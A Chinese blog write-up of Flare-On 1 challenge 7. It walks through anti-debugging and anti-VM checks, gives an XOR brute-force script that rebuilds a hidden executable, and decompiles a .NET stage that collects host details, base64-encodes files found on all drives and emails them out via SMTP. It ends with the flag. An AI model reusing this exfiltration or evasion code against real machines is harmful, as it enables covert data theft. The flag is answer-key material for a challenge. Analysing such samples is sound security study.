---
layout: post
title:  Challenge7[FlareOn1]
date:   2022-01-10 00:08:01 +0300
image:  2022-01-10-woman.jpg
tags:   [ctf,reverse,FlareOn,C#,antidbg]
---

32位ida打开，发现main函数无法识别

存在两处花指令，将其nop掉

![]({{site.baseurl}}/img/2022-01-10-nop.jpg)

按P将其定义为函数

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // dh
  char v4; // ch
  char v5; // ch
  size_t v6; // ebx
  const char *v7; // edi
  size_t i; // ecx
  FILE *v9; // esi
  char FileName[12]; // [esp+Ch] [ebp-10h] BYREF

  v5 = v4 - v3;
  ((void (*)(void))sub_4010C0)();
  sub_401130();
  sub_4011D0();
  sub_4012A0();
  sub_401350();
  sub_4013F0();
  sub_401460();
  sub_4014F0();
  sub_401590();
  sub_4016F0();
  v6 = ElementCount;
  v7 = *argv;
  for ( i = 0; i < v6; ++i )
    byte_4131F8[i] ^= v7[i % 0xC];
  sub_4017A0(i);
  sub_4018A0();
  byte_4131F8[0] = *argv[1];
  byte_4131F9 = argv[1][1];
  byte_413278 = *argv[2];
  byte_413279 = argv[2][1];
  strcpy(FileName, "gratz.exe");
  v9 = fopen(FileName, "wb");
  fwrite(byte_4131F8, 1u, ElementCount, v9);
  fclose(v9);
  system(FileName);
  return 1;
}
```

这里很多函数的作用为反调试

sub_4010C0

使用peb中的BeingDebugged，当调试时这个值为1

```assembly
BOOL sub_4010C0()
{
  BOOL v1; // [esp+8h] [ebp-4h]

  v1 = NtCurrentPeb()->BeingDebugged == 1;
  if ( v1 )
    sub_401000(dword_4130A8);
  else
    sub_401000(dword_4130A4);
  return v1;
}
```

sub_401130

通过IDT检查是否使用虚拟机

```assembly
int sub_401130()
{
  int v0; // edi
  size_t v1; // esi
  size_t v2; // ecx
  _WORD v4[4]; // [esp+8h] [ebp-8h] BYREF

  __sidt(v4);
  v0 = *(_DWORD *)&v4[1];  // IDT反虚拟机
  v1 = ElementCount;
  v2 = 0;
  if ( (*(_DWORD *)&v4[1] & 0xFF000000) != 0xFF000000 )
  {
    if ( ElementCount )
    {
      do
      {
        byte_4131F8[v2] ^= byte_4130AC[v2 % 0xD];
        ++v2;
      }
      while ( v2 < v1 );
    }
    return v0;
  }
  if ( !ElementCount )
    return v0;
  do
  {
    byte_4131F8[v2] ^= byte_4130BC[v2 % 0xE];
    ++v2;
  }
  while ( v2 < v1 );
  return v0;
}
```

sub_4011D0

使用特权指令判断是否使用虚拟机

```assembly
int __usercall sub_4011D0@<eax>(int a1@<ebx>)
{
  unsigned __int32 v1; // eax
  size_t v2; // eax
  size_t v3; // ecx
  char v4; // dl
  char v5; // dl

  v1 = __indword(0x5658u);
  v2 = 0;
  v3 = ElementCount;
  if ( a1 == 'VMXh' )
  {
    if ( ElementCount )
    {
      v5 = byte_413081;
      do
        byte_4131F8[v2++] ^= v5;
      while ( v2 < v3 );
    }
  }
  else if ( ElementCount )
  {
    v4 = byte_413073;
    do
      byte_4131F8[v2++] ^= v4;
    while ( v2 < v3 );
  }
  return 1;
}
```

sub_4012A0

自定义了一个错误码0x1234，OutputDebugStringW在没有调试的情况下会失败导致错误码刷新，所以v0不是自定义的值

```assembly
int sub_4012A0()
{
  DWORD v0; // eax
  size_t v1; // esi
  size_t v2; // ecx

  SetLastError(0x1234u);
  OutputDebugStringW("bah!");
  v0 = GetLastError();
  v1 = ElementCount;
  v2 = 0;
  if ( v0 != 0x1234 )
  {
    if ( ElementCount )
    {
      do
      {
        byte_4131F8[v2] ^= byte_4130DC[v2 % 0x1B];
        ++v2;
      }
      while ( v2 < v1 );
    }
    return 1;
  }
  if ( !ElementCount )
    return 1;
  do
  {
    byte_4131F8[v2] ^= byte_4130F8[v2 % 0x1C];
    ++v2;
  }
  while ( v2 < v1 );
  return 1;
}
```

sub_401350

计算了1e1030到1e1780之间的0xCC数量，未调试时应为0x55

```assembly
int sub_401350()
{
  int v0; // ecx
  int (*v1)(); // eax
  size_t v2; // esi
  size_t v3; // ecx
  size_t v5; // esi
  size_t i; // ecx

  v0 = 0;
  v1 = sub_401030;
  if ( (unsigned int)sub_401030 < (unsigned int)sub_401780 )
  {
    do
    {
      if ( *(_BYTE *)v1 == 0xCC )
        ++v0;
      v1 = (int (*)())((char *)v1 + 1);
    }
    while ( (unsigned int)v1 < (unsigned int)sub_401780 );
    if ( v0 == 0x55 )
    {
      v5 = ElementCount;
      for ( i = 0; i < v5; ++i )
        byte_4131F8[i] ^= byte_41311C[i % 0x1A];
      return 0;
    }
  }
  v2 = ElementCount;
  v3 = 0;
  if ( !ElementCount )
    return 0;
  do
  {
    byte_4131F8[v3] ^= byte_413138[v3 % 0x11];
    ++v3;
  }
  while ( v3 < v2 );
  return 0;
}
```

sub_4013F0

peb偏移0x68处为未公开的一处位置，调试时这个值为0x70

```assembly
BOOL sub_4013F0()
{
  BOOL v1; // [esp+8h] [ebp-4h]

  v1 = NtCurrentPeb()->UnicodeCaseTableData == (void *)0x70;
  if ( v1 )
    sub_401000(dword_41317C);
  else
    sub_401000(dword_413178);
  return v1;
}
```

sub_401460

判断是否为周五

```assembly
int sub_401460()
{
  size_t v0; // esi
  size_t i; // ecx
  size_t v3; // ecx
  size_t v4; // eax
  __time64_t Time; // [esp+0h] [ebp-8h] BYREF

  _time64(&Time);
  if ( _localtime64(&Time)->tm_wday == 5 )
  {
    v0 = ElementCount;
    for ( i = 0; i < v0; ++i )
      byte_4131F8[i] ^= byte_413180[i % 9];
    return 1;
  }
  v3 = ElementCount;
  v4 = 0;
  if ( !ElementCount )
    return 1;
  do
  {
    byte_4131F8[v4] ^= byte_41318C[v4 & 3];
    ++v4;
  }
  while ( v4 < v3 );
  return 1;
}
```

sub_4014F0

判断文件名是否为backdoge.exe，并且这个值会被用作密钥解密

```assembly
int __usercall sub_4014F0@<eax>(const char *a1@<eax>)
{
  size_t v1; // ecx
  size_t v2; // eax
  size_t v4; // esi
  size_t i; // ecx

  if ( !strcmp(a1, aBackdogeExe) )
  {
    v4 = ElementCount;
    for ( i = 0; i < v4; ++i )
      byte_4131F8[i] ^= byte_413198[i % 0xC];
    return 1;
  }
  v1 = ElementCount;
  v2 = 0;
  if ( !ElementCount )
    return 1;
  do
  {
    byte_4131F8[v2] ^= byte_4131A4[v2 & 0xF];
    ++v2;
  }
  while ( v2 < v1 );
  return 1;
}
```

sub_401590

要联网

```assembly
int sub_401590()
{
  struct hostent *v0; // eax
  size_t v1; // esi
  size_t v2; // ecx
  size_t v4; // ecx
  size_t v5; // eax
  size_t v6; // esi
  size_t i; // ecx
  struct WSAData WSAData; // [esp+8h] [ebp-198h] BYREF

  WSAStartup(0x202u, &WSAData);
  v0 = gethostbyname("www.dogecoin.com");
  if ( v0->h_addrtype != 2 )
  {
    v6 = ElementCount;
    for ( i = 0; i < v6; ++i )
      byte_4131F8[i] ^= byte_4131CC[i % 0xC];
    return 1;
  }
  if ( !strcmp(inet_ntoa(**(struct in_addr **)v0->h_addr_list), "127.0.0.1") )
  {
    v1 = ElementCount;
    v2 = 0;
    if ( ElementCount )
    {
      do
      {
        byte_4131F8[v2] ^= byte_4131CC[v2 % 0xC];
        ++v2;
      }
      while ( v2 < v1 );
      return 1;
    }
    return 1;
  }
  v4 = ElementCount;
  v5 = 0;
  if ( !ElementCount )
    return 1;
  do
  {
    byte_4131F8[v5] ^= byte_4131BC[v5 & 0xF];
    ++v5;
  }
  while ( v5 < v4 );
  return 1;
}
```

sub_4016F0

判断时间为17点

```assembly
int sub_4016F0()
{
  size_t v0; // esi
  size_t i; // ecx
  size_t v3; // ecx
  size_t v4; // eax
  __time64_t Time; // [esp+0h] [ebp-8h] BYREF

  _time64(&Time);
  if ( _localtime64(&Time)->tm_hour == 0x11 )
  {
    v0 = ElementCount;
    for ( i = 0; i < v0; ++i )
      byte_4131F8[i] ^= byte_4131E0[i % 9];
    return 1;
  }
  v3 = ElementCount;
  v4 = 0;
  if ( !ElementCount )
    return 1;
  do
  {
    byte_4131F8[v4] ^= byte_4131EC[v4 & 1];
    ++v4;
  }
  while ( v4 < v3 );
  return 1;
}
```

sub_4017A0

要联网

```assembly
int sub_4017A0()
{
  int result; // eax
  char *v1; // ebx
  unsigned int v2; // esi
  size_t v3; // edi
  size_t i; // ecx
  int v5; // edx
  struct WSAData WSAData; // [esp+10h] [ebp-1A8h] BYREF
  char name[20]; // [esp+1A0h] [ebp-18h] BYREF

  WSAStartup(0x202u, &WSAData);
  strcpy(name, "e.root-servers.net");
  result = (int)gethostbyname(name);
  if ( result )
  {
    if ( *(_WORD *)(result + 8) == 2 )
    {
      v1 = inet_ntoa(***(struct in_addr ***)(result + 0xC));
      v2 = strlen(v1);
      v3 = ElementCount;
      for ( i = 0; i < v3; byte_4131F7[i] ^= v1[v5] )
      {
        v5 = i % v2;
        ++i;
      }
    }
    result = 1;
  }
  return result;
}
```

sub_4018A0

szUrl为https://twitter.com/FireEye/status/484033515538116608，要有梯子，不过这里总是返回0，查看了网址

```assembly
int sub_4018A0()
{
  void *v0; // ebx
  void *v1; // eax
  void *v3; // eax
  size_t v4; // edi
  char *v5; // esi
  char *v6; // edi
  char *v7; // esi
  unsigned int v8; // edi
  size_t v9; // ebx
  size_t i; // ecx
  int v11; // edx
  void *v12; // [esp+4h] [ebp-1088h]
  void *hInternet; // [esp+8h] [ebp-1084h]
  DWORD dwNumberOfBytesRead; // [esp+Ch] [ebp-1080h] BYREF
  char Buffer[4096]; // [esp+10h] [ebp-107Ch] BYREF
  WCHAR szUrl[2]; // [esp+1010h] [ebp-7Ch] BYREF
  int v17; // [esp+1014h] [ebp-78h]
  int v18; // [esp+1018h] [ebp-74h]
  int v19; // [esp+101Ch] [ebp-70h]
  int v20; // [esp+1020h] [ebp-6Ch]
  int v21; // [esp+1024h] [ebp-68h]
  int v22; // [esp+1028h] [ebp-64h]
  int v23; // [esp+102Ch] [ebp-60h]
  int v24; // [esp+1030h] [ebp-5Ch]
  int v25; // [esp+1034h] [ebp-58h]
  int v26; // [esp+1038h] [ebp-54h]
  int v27; // [esp+103Ch] [ebp-50h]
  int v28; // [esp+1040h] [ebp-4Ch]
  int v29; // [esp+1044h] [ebp-48h]
  int v30; // [esp+1048h] [ebp-44h]
  int v31; // [esp+104Ch] [ebp-40h]
  int v32; // [esp+1050h] [ebp-3Ch]
  int v33; // [esp+1054h] [ebp-38h]
  int v34; // [esp+1058h] [ebp-34h]
  int v35; // [esp+105Ch] [ebp-30h]
  int v36; // [esp+1060h] [ebp-2Ch]
  int v37; // [esp+1064h] [ebp-28h]
  int v38; // [esp+1068h] [ebp-24h]
  int v39; // [esp+106Ch] [ebp-20h]
  int v40; // [esp+1070h] [ebp-1Ch]
  int v41; // [esp+1074h] [ebp-18h]
  int v42; // [esp+1078h] [ebp-14h]
  char SubStr[12]; // [esp+107Ch] [ebp-10h] BYREF

  v0 = 0;
  v1 = InternetOpenW("ZBot", 1u, 0, 0, 0);
  v12 = v1;
  if ( !v1 )
    return 0;
  *(_DWORD *)szUrl = 0x740068;
  v17 = 0x700074;
  v18 = 0x3A0073;
  v19 = 0x2F002F;
  v20 = 0x770074;
  v21 = 0x740069;
  v22 = 0x650074;
  v23 = 0x2E0072;
  v24 = 0x6F0063;
  v25 = 0x2F006D;
  v26 = 0x690046;
  v27 = 0x650072;
  v28 = 0x790045;
  v29 = 0x2F0065;
  v30 = 0x740073;
  v31 = 0x740061;
  v32 = 0x730075;
  v33 = 0x34002F;
  v34 = 0x340038;
  v35 = 0x330030;
  v36 = 0x350033;
  v37 = 0x350031;
  v38 = 0x330035;
  v39 = 0x310038;
  v40 = 0x360031;
  v41 = 0x300036;
  v42 = 0x38;
  v3 = InternetOpenUrlW(v1, szUrl, 0, 0, 0x400100u, 0);
  hInternet = v3;
  if ( !v3 )
    return 0;
  dwNumberOfBytesRead = 0;
  v4 = 0;
  while ( 1 )
  {
    InternetReadFile(v3, Buffer, 0x1000u, &dwNumberOfBytesRead);
    v5 = (char *)operator new(v4 + dwNumberOfBytesRead);
    memcpy(v5, v0, v4);
    memcpy(&v5[v4], Buffer, dwNumberOfBytesRead);
    operator delete(v0);
    v4 += dwNumberOfBytesRead;
    v0 = v5;
    if ( !dwNumberOfBytesRead )
      break;
    v3 = hInternet;
  }
  strcpy(SubStr, "Secluded Hi");
  v6 = strstr(v5, SubStr);
  if ( v6 )
  {
    v7 = (char *)malloc(8u);
    *(_DWORD *)v7 = 0;
    *((_DWORD *)v7 + 1) = 0;
    strncpy(v7, v6 + 0xB, 7u);
    v8 = strlen(v7);
    v9 = ElementCount;
    for ( i = 0; i < v9; byte_4131F7[i] ^= v7[v11] )
    {
      v11 = i % v8;
      ++i;
    }
  }
  InternetCloseHandle(hInternet);
  InternetCloseHandle(v12);
  return 1;
}
```

然后就是写文件的部分

0x004131F8~0x00519437

把硬编码部分提取出来，保存为encrypted.bin

解密脚本

```assembly
#!/usr/bin/env python

from itertools import product
import array
import string

keys = [['the final countdown','oh happy dayz'],
['UNACCEPTABLE!','omglob'],
["you're so good","you're so bad"],
["\x66","\x01"],
["I'm gonna sandbox your face","Sandboxes are fun to play in"],
["Such fire. Much burn. Wow.","I can haz decode?"],
["Feel the sting of the Monarch!","\x09\x00\x00\x01"],
["\x21\x20\x35\x30\x20\x31\x33\x33\x37"],
["MATH IS HARD","LETS GO SHOPPING"],
["LETS GO MATH","SHOPPING IS HARD"],
["\x01\x02\x03\x05\x00\x78\x30\x38\x0D"],
["backdoge.exe"],
["192.203.230.10"],
["jackRAT"]]

encrypted_file = bytearray(open('encrypted.bin', 'rb').read())

def xor(data, key):
       l = len(key)
       return bytearray((
       (data[i] ^ key[i % l]) for i in range(0,len(data))
       ))

for x in product(*keys):
  version = encrypted_file
  for y in x:
    version = xor(version,array.array('B', y))
  if (version.find("DOS mode") != -1):
    open('gratz.exe', 'wb').write(version)
    print(x)
    quit()
```

> python2 job.py
> ('the final countdown', 'omglob', "you're so bad", 'f', "I'm gonna sandbox your face", 'Such fire. Much burn. Wow.', '\t\x00\x00\x01', '! 50 1337', 'MATH IS HARD', 'SHOPPING IS HARD', '\x01\x02\x03\x05\x00x08\r', 'backdoge.exe', '192.203.230.10', 'jackRAT')

得到gratz.exe，.net64位文件，dnspy打开分析

main

```assembly
using System;
using System.Windows.Forms;

namespace Finisher
{
	// Token: 0x02000004 RID: 4
	internal static class Program
	{
		// Token: 0x0600000C RID: 12 RVA: 0x00002A34 File Offset: 0x00000C34
		[STAThread]
		private static void Main()
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new Form1());
		}
	}
}
```

Application为系统库里的类，我们应该分析的为Form1

```assembly
using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Finisher
{
	// Token: 0x02000002 RID: 2
	public class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
			Thread thread = new Thread(new ThreadStart(this.lulzors));
			thread.Start();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002084 File Offset: 0x00000284
		public void lulzors()
		{
			lulz lulz = new lulz();
			Thread thread = new Thread(new ThreadStart(lulz.datwork));
			thread.Start();
			while (thread.IsAlive)
			{
			}
			this.label2.Text = lulz.decoder4("\v\fP\u000e\u000fBA\u0006\rG\u0015I\u001a\u0001\u0016H\\\t\b\u0002\u0013/\b\t^\u001d\bJO\a]C\u001b\u0005");
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020CD File Offset: 0x000002CD
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020EC File Offset: 0x000002EC
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
			this.label1 = new Label();
			this.label4 = new Label();
			this.label2 = new Label();
			this.label3 = new Label();
			this.label5 = new Label();
			this.label6 = new Label();
			this.label8 = new Label();
			this.pictureBox2 = new PictureBox();
			((ISupportInitialize)this.pictureBox2).BeginInit();
			base.SuspendLayout();
			this.label1.AutoSize = true;
			this.label1.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label1.Location = new Point(76, 19);
			this.label1.Name = "label1";
			this.label1.Size = new Size(661, 36);
			this.label1.TabIndex = 1;
			this.label1.Text = "This guy says you are almost done!";
			this.label4.AutoSize = true;
			this.label4.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label4.Location = new Point(109, 688);
			this.label4.Name = "label4";
			this.label4.Size = new Size(547, 36);
			this.label4.TabIndex = 4;
			this.label4.Text = "Please send your address and";
			this.label2.AutoSize = true;
			this.label2.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label2.Location = new Point(158, 781);
			this.label2.Name = "label2";
			this.label2.Size = new Size(0, 36);
			this.label2.TabIndex = 2;
			this.label3.AutoSize = true;
			this.label3.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label3.Location = new Point(232, 724);
			this.label3.Name = "label3";
			this.label3.Size = new Size(319, 36);
			this.label3.TabIndex = 5;
			this.label3.Text = "phone number to:";
			this.label5.AutoSize = true;
			this.label5.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label5.Location = new Point(24, 840);
			this.label5.Name = "label5";
			this.label5.Size = new Size(756, 36);
			this.label5.TabIndex = 6;
			this.label5.Text = "We would like to contact you to verify ";
			this.label6.AutoSize = true;
			this.label6.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label6.Location = new Point(1, 876);
			this.label6.Name = "label6";
			this.label6.Size = new Size(794, 36);
			this.label6.TabIndex = 7;
			this.label6.Text = "how you completed the challenges and then";
			this.label8.AutoSize = true;
			this.label8.Font = new Font("Courier New", 24f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label8.Location = new Point(187, 912);
			this.label8.Name = "label8";
			this.label8.Size = new Size(395, 36);
			this.label8.TabIndex = 9;
			this.label8.Text = "send you your prize!";
			this.pictureBox2.BorderStyle = BorderStyle.Fixed3D;
			this.pictureBox2.Image = (Image)componentResourceManager.GetObject("pictureBox2.Image");
			this.pictureBox2.Location = new Point(59, 67);
			this.pictureBox2.Name = "pictureBox2";
			this.pictureBox2.Size = new Size(687, 618);
			this.pictureBox2.TabIndex = 11;
			this.pictureBox2.TabStop = false;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(792, 946);
			base.Controls.Add(this.pictureBox2);
			base.Controls.Add(this.label8);
			base.Controls.Add(this.label6);
			base.Controls.Add(this.label5);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.label4);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.label1);
			base.FormBorderStyle = FormBorderStyle.Fixed3D;
			base.Name = "Form1";
			this.Text = "CONGRATULATIONS!";
			((ISupportInitialize)this.pictureBox2).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000001 RID: 1
		private IContainer components;

		// Token: 0x04000002 RID: 2
		private Label label1;

		// Token: 0x04000003 RID: 3
		private Label label4;

		// Token: 0x04000004 RID: 4
		private Label label2;

		// Token: 0x04000005 RID: 5
		private Label label3;

		// Token: 0x04000006 RID: 6
		private Label label5;

		// Token: 0x04000007 RID: 7
		private Label label6;

		// Token: 0x04000008 RID: 8
		private Label label8;

		// Token: 0x04000009 RID: 9
		private PictureBox pictureBox2;
	}
}
```

lulz

```assembly
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;

namespace Finisher
{
	// Token: 0x02000003 RID: 3
	public class lulz
	{
		// Token: 0x06000005 RID: 5 RVA: 0x00002668 File Offset: 0x00000868
		public string decoder1(string encoded)
		{
			string text = "";
			string text2 = "lulz";
			for (int i = 0; i < encoded.Length; i++)
			{
				text += (encoded[i] ^ text2[i % text2.Length]);
			}
			return text;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000026B8 File Offset: 0x000008B8
		public string decoder2(string encoded)
		{
			string text = "";
			string text2 = "this";
			for (int i = 0; i < encoded.Length; i++)
			{
				text += (encoded[i] ^ text2[i % text2.Length]);
			}
			return text;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002708 File Offset: 0x00000908
		public string decoder3(string encoded)
		{
			string text = "";
			string text2 = "silly";
			for (int i = 0; i < encoded.Length; i++)
			{
				text += (encoded[i] ^ text2[i % text2.Length]);
			}
			return text;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002758 File Offset: 0x00000958
		public string decoder4(string encoded)
		{
			string text = "";
			string text2 = this.decoder2("\u001b\u0005\u000eS\u001d\u001bI\a\u001c\u0001\u001aS\0\0\fS\u0006\r\b\u001fT\a\a\u0016K");
			for (int i = 0; i < encoded.Length; i++)
			{
				text += (encoded[i] ^ text2[i % text2.Length]);
			}
			return text;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000027AC File Offset: 0x000009AC
		public void datwork()
		{
			string text = "";
			text += this.decoder1("(\u0014\u0018Z.\u0010\r\u0019\u0003\u001bVpAXAWAXAWAXAWAXAWAXAWAXAWAXAWAXAWAXAp");
			text = text + this.decoder2("9\t\n\u001b\u001d\u0006\fIT") + Environment.MachineName + "\n";
			text = text + this.decoder3("&\u001a\t\u001e=\u001c\u0004\r\u0005\u0017II") + Environment.UserDomainName + "\n";
			text = text + this.decoder1("9\u0006\t\bVU") + Environment.UserName + "\n";
			object obj = text;
			text = string.Concat(new object[]
			{
				obj,
				this.decoder2(";;I%\u0011\u001a\u001a\u001a\u001b\u0006SS"),
				Environment.OSVersion,
				"\n"
			});
			foreach (string text2 in Environment.GetLogicalDrives())
			{
				text = text + this.decoder3("7\u001b\u0005\u001a\u001cII") + text2 + "\n";
				this.yum(text2, this.decoder1("\u001b\u0014\0\u0016\t\u0001B\u001e\r\u0001"), ref text);
			}
			string str = "";
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ipaddress in hostEntry.AddressList)
			{
				if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
				{
					str = ipaddress.ToString();
					break;
				}
			}
			text = text + this.decoder3(":9VL") + str + "\n\n";
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add(this.decoder2("\u0015\u0004X]\u0010\t\u001d]\u0010\t\u001d\u00124\u000e\u0005\u0012\u0006\rD\u001c\u001aF\n\u001c\u0019"));
			mailMessage.Subject = this.decoder3(":N\u0001L\u0018S\n\u0003\u0001\t\u0006\u001d\t\u001e");
			mailMessage.From = new MailAddress(this.decoder1("\0\0\0\0,\u0013\0\u001b\u001e\u0010A\u0015\u0002[\u000f\u0015\u0001"));
			mailMessage.Body = text;
			SmtpClient smtpClient = new SmtpClient(this.decoder2("\a\u0005\u001d\u0003Z\u001b\f\u0010\u0001\u001a\f\0\u0011\u001a\u001f\u0016\u0006F\a\u0016\0"));
			smtpClient.Send(mailMessage);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002974 File Offset: 0x00000B74
		public void yum(string folder, string name, ref string info)
		{
			try
			{
				foreach (string text in Directory.GetFiles(folder))
				{
					if (text.EndsWith(name))
					{
						byte[] inArray = File.ReadAllBytes(text);
						info = info + this.decoder3("=\u0006\u0001\u001fCS") + text + "\n";
						info = info + Convert.ToBase64String(inArray) + "\n";
					}
				}
				foreach (string folder2 in Directory.GetDirectories(folder))
				{
					this.yum(folder2, name, ref info);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}
	}
}
```

利用反编译的源代码写一个C#解密程序

```assembly
using System;

namespace job
{
    class Program
    {
        static void Main(string[] args)
        {
            string s = decoder4("\v\fP\u000e\u000fBA\u0006\rG\u0015I\u001a\u0001\u0016H\\\t\b\u0002\u0013/\b\t^\u001d\bJO\a]C\u001b\u0005");
            Console.WriteLine(s);
        }

        static public string decoder2(string encoded)
        {
        string str1 = "";
        string str2 = "this";
        for (int index = 0; index < encoded.Length; ++index)
            str1 = str1 + (object) (char) ((uint) encoded[index] ^ (uint) str2[index % str2.Length]);
        return str1;
        }

        static public string decoder4(string encoded)
        {
        string str1 = "";
        string str2 = decoder2("\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K");
        for (int index = 0; index < encoded.Length; ++index)
            str1 = str1 + (object) (char) ((uint) encoded[index] ^ (uint) str2[index % str2.Length]);
        return str1;
        }

        // static public string decoder4(string encoded)
		// {
		// 	string text = "";
		// 	string text2 = decoder2("\u001b\u0005\u000eS\u001d\u001bI\a\u001c\u0001\u001aS\0\0\fS\u0006\r\b\u001fT\a\a\u0016K");
		// 	for (int i = 0; i < encoded.Length; i++)
		// 	{
		// 		text += (encoded[i] ^ text2[i % text2.Length]);
		// 	}
		// 	return text;
		// }

        // static public string decoder2(string encoded)
		// {
		// 	string text = "";
		// 	string text2 = "this";
		// 	for (int i = 0; i < encoded.Length; i++)
		// 	{
		// 		text += (encoded[i] ^ text2[i % text2.Length]);
		// 	}
		// 	return text;
		// }
    }
}
```

da7.f1are.finish.lin3@flare-on.com